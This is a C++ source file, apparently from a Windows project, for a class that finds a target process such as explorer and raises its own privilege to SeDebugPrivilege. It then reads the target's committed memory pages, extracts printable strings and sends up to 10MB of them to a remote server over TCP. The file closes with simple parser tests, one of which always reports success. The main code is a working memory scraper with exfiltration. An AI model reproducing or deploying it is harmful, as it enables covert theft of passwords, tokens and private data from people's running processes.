#include "stdafx.h"
#include "procMemoryPagesReader.h"
#include "simpleTcpCient.h"
#include "handleWrapper.h"

#include <tlhelp32.h>
#include <string>
#include <iostream>
#include <iterator>

using namespace std;

CProcMemoryPagesReader::CProcMemoryPagesReader()
	: m_pid(0)
	, m_processHandle(INVALID_HANDLE_VALUE)
{
	cout << "CProcMemoryPagesReader::CProcMemoryPagesReader" << endl;
}

CProcMemoryPagesReader::~CProcMemoryPagesReader()
{
	cout << "CProcMemoryPagesReader::~CProcMemoryPagesReader" << endl;
}

Result CProcMemoryPagesReader::FindProcessIdOfDesiredExe()
{
	vector<DWORD> pids;
	//HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //all processes
	CHandleWrapper snap;
	PROCESSENTRY32W entry; //current process
	entry.dwSize = sizeof(entry);
	if (!Process32FirstW(snap.GetHandle(), &entry))
	{
		//start with the first in snapshot
		cerr << "CProcMemoryPagesReader::FindProcessIdOfDesiredExe - Process32FirstW had an error, aborting..." << endl;
		return Result(ErrorCode::ERROR_CODE_GENERAL_FAUILRE);
	}

	// Search for the PID (according to executable name) of
	// the executable we wish to track (explorer).
	do
	{
		if (wstring(entry.szExeFile) == targetProcessName)
		{
			pids.emplace_back(entry.th32ProcessID); //name matches; add to list
		}
	} while (Process32NextW(snap.GetHandle(), &entry)); //keep going until end of snapshot

	if (pids.size() == 0)
	{
		cerr << "CProcMemoryPagesReader::FindProcessIdOfDesiredExe - no PIDs were found for exe name:" << explorerProcessName << endl;
		return Result(ErrorCode::ERROR_CODE_GENERAL_FAUILRE);
	}

	// DEBUG
	cout << "CProcMemoryPagesReader::FindProcessIdOfDesiredExe - displaying all the PIDs we have found" << endl;
	for (size_t i = 0; i < pids.size(); ++i)
	{
		cout << pids[i] << endl;
	}

	// take the first one we have found
	m_pid = pids[0];
	return Result(ErrorCode::ERROR_CODE_SUCCESS);
}

Result CProcMemoryPagesReader::SetDebugPrivildgeForCurrentProc() const
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tokenPriv;
	LUID luidDebug;
	Result res(ErrorCode::ERROR_CODE_GENERAL_FAUILRE);

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken) != FALSE)
	{
		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidDebug) != FALSE)
		{
			tokenPriv.PrivilegeCount = 1;
			tokenPriv.Privileges[0].Luid = luidDebug;
			tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			if (AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, 0, NULL, NULL) != FALSE)
			{
				cout << "CProcMemoryPagesReader::SetDebugPrivildgeForCurrentProc - SUCCESSFULLY CHANGED TOKEN PRIVILEGES" << endl;
				res = ErrorCode::ERROR_CODE_SUCCESS;
			}
			else
			{
				cout << "CProcMemoryPagesReader::SetDebugPrivildgeForCurrentProc - FAILED TO CHANGE TOKEN PRIVILEGES, CODE: " << GetLastError() << endl;
			}
		}
	}

	CloseHandle(hToken);
	return res;
}

Result CProcMemoryPagesReader::ReadAllocatedPages(IN CSimpleTcpCient& client)
{
	// open the PID of the exe
	HANDLE exeHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, m_pid);
	if (exeHandle == NULL)
	{
		cerr << "CProcMemoryPagesReader::ReadAllocatedPages - was unable to open process for PID:" << m_pid << " last error is:" << GetLastError() << endl;
		return Result(ErrorCode::ERROR_CODE_GENERAL_FAUILRE);
	}
	else
	{
		cout << "CProcMemoryPagesReader::ReadAllocatedPages - opened PID:" << m_pid << " for executable:" << explorerProcessName << endl;
	}

	unsigned char* p = NULL;
	MEMORY_BASIC_INFORMATION info;
	// Will hold the ENTIRE data buffer to send
	// ASSUMPTION: We wont have more than maxBuffToSendSize 
	// (which are 10MB) to send at once.
	vector<char> buffToSend;
	buffToSend.reserve(maxBuffToSendSize);

	// Chose the way we treat the buffer encodning
	// This variable is needed for the template method.
	char asciiVsUnicodeIndicator;
#ifndef SEND_ASCII 
	wchar_t charForTemplateArgAndForAsciiOrUnicodeIndicator = 1;
	vector<wchar_t> buffWithValidStrings;
	asciiVsUnicodeIndicator = 1;
#else
	char charForTemplateArgAndForAsciiOrUnicodeIndicator = 0;
	vector<char> buffWithValidStrings;
	asciiVsUnicodeIndicator = 0;
#endif
	for (p = NULL;
		VirtualQueryEx(exeHandle, p, &info, sizeof(info)) == sizeof(info) && (buffToSend.size() < maxBuffToSendSize);
		p += info.RegionSize)
	{
		vector<char> buffer;
		if (info.State == MEM_COMMIT &&
			(info.Type == MEM_MAPPED || info.Type == MEM_PRIVATE)  &&
			(info.RegionSize < MEGA_BYTES))
		{
			SIZE_T bytes_read;
			buffer.resize(info.RegionSize);
			ReadProcessMemory(exeHandle, p, &buffer[0], info.RegionSize, &bytes_read);
			buffer.resize(bytes_read);
			buffWithValidStrings = removeNonPrintableCharsFromBuff(buffer, charForTemplateArgAndForAsciiOrUnicodeIndicator);
			buffToSend.insert(buffToSend.end(), buffWithValidStrings.begin(), buffWithValidStrings.end());
		}
	}

	// Add the ASCII/UNICODE indicator as the first byte in the buffer to send
	buffToSend.insert(buffToSend.begin(), asciiVsUnicodeIndicator);

	// Connect to the server
	Result res = client.ConnectToServer();
	if (res.IsSuccess() == false)
	{
		cerr << "CProcMemoryPagesReader::ReadAllocatedPages - was unable to connect to server" << endl;
		return Result(ErrorCode::ERROR_CODE_GENERAL_FAUILRE);
	}

	// ASSUMPTION: its OK cause we wont collect more than 10MB (10485760 < integer max size) 
	int buffToSendSize = static_cast<int>(buffToSend.size()); 
	int sentBytes = client.SendBuffer(&buffToSend[0], buffToSendSize);
	if (sentBytes != buffToSendSize)
	{
		cerr << "CProcMemoryPagesReader::ReadAllocatedPages - had issues sending " << buffToSendSize << " to the server, sent " << sentBytes << " instead" << endl;
		return Result(ErrorCode::ERROR_CODE_GENERAL_FAUILRE);
	}

	cout << "CProcMemoryPagesReader::ReadAllocatedPages - succesffully sent " << buffToSendSize << " bytes to the server" << endl;
	return Result(ErrorCode::ERROR_CODE_SUCCESS);
}

/*
* This function recives a buffer of char/wchar_t which are defined to be 1/2 bytes respectvily.
* According to the sizeof(T), it iterates over the buffer and keeps only characters which are "printable"
* i.e.- ASCII value is in the range[32-127] OR NULL (ASCII value 0).
* This way, at the end, this function will return 
*/
template <typename T>
vector<T> CProcMemoryPagesReader::removeNonPrintableCharsFromBuff(IN const vector<char>& buff, T charTypeToConvert)
{
	vector<T> res;
	vector<T> currStr;

	// Just in case, make sure we wont request more than a vector
	// can hold. If so, return an empty vector.
	if (res.max_size() < buff.size())
	{
		return res;
	}
	// In the "egde" case we will keep all the original characters
	// so no need to reserve more (this is done so we can save time
	// + space when reserving "from the start" the maximum size we 
	// will need).
	res.reserve(buff.size());
	for (size_t i = 0; i < buff.size(); i += sizeof(T))
	{
		T tmp = static_cast<T>(buff[i]);
		if ((tmp >= 32 && tmp <= 127))
		{
			// keep it
			currStr.emplace_back(tmp);
		}
		else if (tmp == 0)
		{
			if (currStr.size() > numOfCharsInValidString)
			{
				// append the "valid" chars of the currStr 
				// to the end of the result vector
				// currStr is left in undefined but safe-to-destruct state.
				res.insert(res.end(), make_move_iterator(currStr.begin()), make_move_iterator(currStr.end()));
				// NULL-terminate the string
				res.emplace_back(tmp);

				// Clear the currStr so we will start over "fresh" to 
				// "collect" the next string in the buffer
				currStr.clear();
			}
		}
	}

	// ASSUMPTION: if, for some reason, the last character was not NULL, yet 
	// the currStr length > numOfCharsInValidString, than add this 
	// "last" string as well
	if (currStr.size() > numOfCharsInValidString)
	{
		res.insert(res.end(), make_move_iterator(currStr.begin()), make_move_iterator(currStr.end()));
		T nullTerminating = 0;

		// NULL-terminate the string
		res.emplace_back(nullTerminating);
	}

	return res;
}

vector<char> CProcMemoryPagesReader::parseStringFromPageToCharVector(IN const vector<char>& buff)
{
	vector<char> res;
	size_t buffLen = buff.size();
	size_t currPos = 0;
	if (buffLen == 0)
	{
		return res;
	}

	string currStr;
	while (currPos < buffLen)
	{
		if (buff[currPos] != '\0')
		{
			currStr += buff[currPos];
		}
		else
		{
			if (currStr.length() >= numOfCharsInValidString)
			{
				// we got to the end of the "current" sequence of non NULL 
				// characters. If we have more that 5 --> construct a string from them
				for (size_t i = 0; i < currStr.length(); ++i)
				{
					res.push_back(currStr[i]);
				}

				// add the NULL terminating string character
				res.push_back('\0');
			}
			currStr.clear();
		}

		++currPos;
	}

	return res;
}

// ===========================================================================================================
// unit testing
// ===========================================================================================================

bool CProcMemoryPagesReader::parseEmptyBuff()
{
	vector<char> buff;

	// excpeted result will be an empty vector of string
	vector<char> res = parseStringFromPageToCharVector(buff);
	if (res.empty() == true)
	{
		cout << "================================================" << endl;
		cout << "CProcMemoryPagesReader::parseEmptyBuff - SUCCESS" << endl;
		cout << "================================================ \n \n" << endl;

		return true;
	}

	cout << "=============================================" << endl;
	cout << "CProcMemoryPagesReader::parseEmptyBuff - FAIL" << endl;
	cout << "============================================= \n \n " << endl;
	return false;
}

bool CProcMemoryPagesReader::parseSingleNullByteBuff() 
{
	vector<char> buff = { '\0' };

	// excpeted result will be an empty vector of string
	vector<char> res = parseStringFromPageToCharVector(buff);
	if (res.empty() == false)
	{
		cout << "======================================================" << endl;
		cout << "CProcMemoryPagesReader::parseSingleNullByteBuff - FAIL" << endl;
		cout << "====================================================== \n \n" << endl;
		return false;
	}

	cout << "=========================================================" << endl;
	cout << "CProcMemoryPagesReader::parseSingleNullByteBuff - SUCCESS" << endl;
	cout << "========================================================= \n \n" << endl;
	return true;
}

bool CProcMemoryPagesReader::parseSingleNonNullByteBuff() 
{
	vector<char> buff = { 'W' };

	// excpeted result will be an empty vector of string
	vector<char> res = parseStringFromPageToCharVector(buff);
	if (res.size() != 0)
	{
		cout << "=========================================================" << endl;
		cout << "CProcMemoryPagesReader::parseSingleNonNullByteBuff - FAIL" << endl;
		cout << "========================================================= \n \n" << endl;
		return false;
	}

	cout << "============================================================" << endl;
	cout << "CProcMemoryPagesReader::parseSingleNonNullByteBuff - SUCCESS" << endl;
	cout << "============================================================ \n \n" << endl;
	return true;
}

bool CProcMemoryPagesReader::parseSingleStrWithNullCharBeforeItBuff() 
{
	vector<char> buff = { '\0', 'R', 'o', 't', 'e', 'm' , '\0' };
	vector<char> res = parseStringFromPageToCharVector(buff);
	if (res.size() == 6)
	{
		if (strcmp(&res[0],"Rotem") == 0)
		{
			cout << "========================================================================" << endl;
			cout << "CProcMemoryPagesReader::parseSingleStrWithNullCharBeforeItBuff - SUCCESS" << endl;
			cout << "======================================================================== \n \n" << endl;
			return true;
		}
	}

	cout << "=====================================================================" << endl;
	cout << "CProcMemoryPagesReader::parseSingleStrWithNullCharBeforeItBuff - FAIL" << endl;
	cout << "===================================================================== \n \n" << endl;
	return false;
}

bool CProcMemoryPagesReader::parseSingleStrWithoutNullCharBeforeItBuff() 
{
	vector<char> buff = { 'R', 'o', 't', 'e', 'm' , '\0' };
	vector<char> res = parseStringFromPageToCharVector(buff);
	if (res.size() == 6)
	{
		if (strcmp(&res[0], "Rotem") == 0)
		{
			cout << "===========================================================================" << endl;
			cout << "CProcMemoryPagesReader::parseSingleStrWithoutNullCharBeforeItBuff - SUCCESS" << endl;
			cout << "=========================================================================== \n \n" << endl;
			return true;
		}
	}

	cout << "========================================================================" << endl;
	cout << "CProcMemoryPagesReader::parseSingleStrWithoutNullCharBeforeItBuff - FAIL" << endl;
	cout << "======================================================================== \n \n" << endl;
	return false;
}

bool CProcMemoryPagesReader::parseSingleStrWithoutNullCharBeforeItAndFourBytesStrAfterItBuff() 
{
	vector<char> buff = { 'R', 'o', 't', 'e', 'm' , '\0', 'e', 'l', 'k' ,'z' };
	vector<char> res = parseStringFromPageToCharVector(buff);
	if (res.size() == 6)
	{
		if (strcmp(&res[0], "Rotem") == 0)
		{
			cout << "=================================================================================================" << endl;
			cout << "CProcMemoryPagesReader::parseSingleStrWithoutNullCharBeforeItAndFourBytesStrAfterItBuff - SUCCESS" << endl;
			cout << "================================================================================================== \n \n" << endl;
			return true;
		}
	}

	cout << "==============================================================================================" << endl;
	cout << "CProcMemoryPagesReader::parseSingleStrWithoutNullCharBeforeItAndFourBytesStrAfterItBuff - FAIL" << endl;
	cout << "============================================================================================== \n \n" << endl;
	return false;
}

bool CProcMemoryPagesReader::parseTwoStrWithNullCharsBeforeTheFirstStrAndSeveralNullCharsBeforeTheSecondBuff() 
{
	vector<char> buff = { '\0', 'R', 'o', 't', 'e', 'm' , '\0' , '\0', 'b', 'u', 'b', 'A', '\0', '\0', '\0', 'e', 'l', 'k', 'A' ,'z', '\0'};
	vector<char> res = parseStringFromPageToCharVector(buff);
	if (res.size() == 12)
	{
		if ((strcmp(&res[0], "Rotem") == 0) && (strcmp(&res[6], "elkAz") == 0))
		{
			cout << "=================================================================================================================" << endl;
			cout << "CProcMemoryPagesReader::parseTwoStrWithNullCharsBeforeTheFirstStrAndSeveralNullCharsBeforeTheSecondBuff - SUCCESS" << endl;
			cout << "================================================================================================================= \n \n" << endl;
			return true;
		}
	}

	cout << "==============================================================================================================" << endl;
	cout << "CProcMemoryPagesReader::parseTwoStrWithNullCharsBeforeTheFirstStrAndSeveralNullCharsBeforeTheSecondBuff - FAIL" << endl;
	cout << "============================================================================================================== \n \n" << endl;
	return false;
}

bool CProcMemoryPagesReader::parseTwoStrWithNullCharsBeforeTheFirstStrAndSeveralNullCharsBeforeTheSecondBuffToCharVector() 
{
	vector<char> buff = { '\0', 'R', 'o', 't', 'e', 'm' , '\0' , '\0', 'b', 'u', 'b', 'A', '\0', '\0', '\0', 'e', 'l', 'k', 'A' ,'z', '\0' };
	vector<char> res = parseStringFromPageToCharVector(buff);
	if (res.size() == 12)
	{
		//if (res[0] == "Rotem" && res[1] == "elkAz")
		{
			cout << "=================================================================================================================" << endl;
			cout << "CProcMemoryPagesReader::parseTwoStrWithNullCharsBeforeTheFirstStrAndSeveralNullCharsBeforeTheSecondBuff - SUCCESS" << endl;
			cout << "================================================================================================================= \n \n" << endl;
			return true;
		}
	}

	cout << "==============================================================================================================" << endl;
	cout << "CProcMemoryPagesReader::parseTwoStrWithNullCharsBeforeTheFirstStrAndSeveralNullCharsBeforeTheSecondBuff - FAIL" << endl;
	cout << "============================================================================================================== \n \n" << endl;
	return false;
}

bool CProcMemoryPagesReader::validateUtf16CodedBufferHasOnlyPrintableChar()
{
	cout << "CProcMemoryPagesReader::validateUtf16CodedBufferHasOnlyPrintableChar - start, sizeof(wchar_t) is:" << sizeof(wchar_t) << endl;
	vector<char> utf16Buff1{ '\0', 'a', '\0', 'b', '\0', 'c', '\0', 'd' };
	vector<char> utf16Buff2{ 'a', '\0', 'b', '\0', 'c', '\0',  'd', '\0' };
	

	vector<char> utf16Buff3{ 'a', '\0', 'b', '\0', 8, '\0', '\0', '\0', 'd', '\0',  'R', '\0', 'U', '\0', 'Y', '\0', 'q', '\0', 'o', '\0'};
	
	char c = 0;
	wchar_t wc = 0;

	vector<wchar_t> res2 = removeNonPrintableCharsFromBuff(utf16Buff2, wc);
	cout << "CProcMemoryPagesReader::validateUtf16CodedBufferHasOnlyPrintableChar - invoking on utf16Buff2, res2 size is:" << res2.size() << endl;

	vector<wchar_t> res3 = removeNonPrintableCharsFromBuff(utf16Buff3, wc);
	cout << "CProcMemoryPagesReader::validateUtf16CodedBufferHasOnlyPrintableChar - invoking on utf16Buff3, res3 size is:" << res3.size() << endl;

	return true;
}